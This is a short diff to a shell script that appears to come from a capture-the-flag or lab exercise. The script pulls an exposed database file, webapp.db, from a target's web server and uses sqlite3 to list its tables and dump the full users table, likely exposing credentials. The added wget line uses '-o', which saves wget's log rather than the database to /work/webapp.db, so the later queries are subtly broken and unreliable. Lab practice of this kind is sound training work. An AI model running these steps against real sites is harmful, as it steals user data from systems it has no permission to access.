@@ -12,9 +12,10 @@ attack_ip="10.10.30.237"
 mkdir /work/
 
 # Collect database content from assets directory (look at the page source code)
-wget http://$target_ip:81/assets/webapp.db
+wget http://$target_ip:81/assets/webapp.db -o /work/webapp.db
 
 # Use sqlite3 to gather content
 # Perform the query
-sqlite3 webapp.db ".tables"
-sqlite3 webapp.db "PRAGMA table_info(users)"
+sqlite3 /work/webapp.db ".tables"
+sqlite3 /work/webapp.db "PRAGMA table_info(users)"
+sqlite3 /work/webapp.db "SELECT * FROM users;"
